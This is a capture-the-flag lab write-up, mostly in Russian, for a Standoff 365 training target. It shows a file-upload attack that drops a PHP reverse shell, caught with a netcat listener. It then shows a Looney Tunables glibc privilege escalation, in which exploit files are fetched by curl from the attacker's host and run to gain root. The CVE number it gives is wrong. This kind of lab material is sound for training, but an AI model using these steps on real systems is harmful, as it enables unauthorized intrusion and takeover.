---
attack: file upload
lpe: ldd
---

####                     web-1-1 web-1-2 library.edu.stf | Standoff 365

CTF reference: Bootcamp [(standoff365.com)](https://range.standoff365.com/battle/7/industry/27/?tab=risks)

Сontents:
Web-1-1
-Step 1: Preparing
-Step 2: Gathering information
-Step 3: Attack
Web-1-2
 

#### подготовка 

используем команду и добавляем следующие записи  
`sudo nano /etc/hosts`

```
10.124.1.231   aircraft.edu.stf
10.124.1.232   calculator.edu.stf
10.124.1.233   library.edu.stf
10.124.1.234   wp.edu.stf
10.124.1.235   www.edu.stf
10.124.1.236   gallery.edu.stf
10.124.1.237   utils.edu.stf
10.124.1.238   shop.edu.stf
10.124.1.239   tokenizer.edu.stf
10.124.1.240   bind.edu.stf
10.124.1.241   smashmusic.edu.stf
10.124.1.242   test-webserver.edu.stf
10.124.1.253   vpn.edu.stf
```

### web-1-1
#### scout
 Переходим на страницу    http://library.edu.stf/
и видим сылку на либу(нижний правый угол ), переходим на нее
 ![[Pasted image 20240907102613.png]]

![Pasted image 20240907102613](https://github.com/user-attachments/assets/6f750eb3-bc5d-472d-bdec-052f1818ee50)

 
Переходим по этой кнопке и видим следующий интерфейс 
![[Pasted image 20240907103230.png]]

 Далее логичное предположение что авторы заданиях хотят чтобы мы провернули уязвимость с манипуляцией файлов. 
 
Так зная что  это за уязвимость я сразу загуглил (это файл стандартный файл что можно использовать в таких рода заданиях)
reverse shell php
https://github.com/pentestmonkey/php-reverse-shell
![[Pasted image 20240907103507.png]]

Почему php? потому что расширение в браузере показывает какие есть языки на веб сервере
![[1_IFNZ4MZsfGWT14927hjLwg.png]]

Далее копируем файл любым удобным способом 
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Открыв его после скачивания, ознакомимся с файлом фото1
Видим что нужно поменять значения  данные значения на свой порт и айпи , так чтобы узнать какой именно у нас Ip нам нужно использовать команду `ip a ` фото 2-3


![[Pasted image 20240907103711.png]]
фото1


![[Pasted image 20240907103901.png]]
И смотрим значение tun0 Так как нам нужно значение нашего айпи в ВПН, это важно 
![[Pasted image 20240907103929.png]]
фото 2-3

В значении порт указывает тот порт что мы будем слушать через команду `rlwrap nc -lnvp YOUR PORT  `   или nc -lnvp YOUR PORT
#### Attack
send to repeater
![[Pasted image 20240907104505.png]]

Удаляем данные картники , (можно и подругому делать но я лично так)

![[Pasted image 20240907104715.png]]



![[Pasted image 20240907105000.png]]

Смотрим на вебе получилось ли закинуть файл или т.п 

Далее нужно узнать как вызвать , для этого я вызвал  картнику и посмотрел ее адрес на сайте

![[Pasted image 20240907105541.png]]
![[Pasted image 20240907105713.png]]
Узнав адрес обычный адрес картинки, мы просто меняем адрес этой картники на название нашего revershell , как видно ниже и тем самым мы запускаем данные скипт и он подключается к нам
http://library.edu.stf/wp-content/shell33.php

![[Pasted image 20240907110550.png]]

https://github.com/rapid7/metasploit-framework/issues/18429

### web-1-2 Lpe
Looney Tunables poc github
Проверка версии glibc
Выполните команду для получения версии glibc:
>ldd --version

Вывод будет примерно таким:
```
 ldd (Ubuntu GLIBC 2.35-0ubuntu3.4) 2.35
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
```
Проверьте, находится ли версия glibc в диапазоне от 2.34 до 2.39. Если да, то ваш сервер уязвим.
Вроде эта https://github.com/hadrian3689/looney-tunables-CVE-2023-49111

`python3 -m http.server 4646`

```
$ curl -O http://10.127.244.55:4646/exp.c

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3814  100  3814    0     0  88473      0 --:--:-- --:--:-- --:--:-- 90809
$ $ curl -O http://10.127.244.55:4646/libc.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   670  100   670    0     0  15509      0 --:--:-- --:--:-- --:--:-- 33500
$ 
$ 
$ ls
exp.c
libc.py
$ chmod +x *

$ python3 libc.py
$ ls
"
exp.c
libc.py
$ gcc exp.c -o exp
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ls
"
exp
exp.c
libc.py
$ ./exp
id
uid=0(root) gid=33(www-data) groups=33(www-data)

```

 
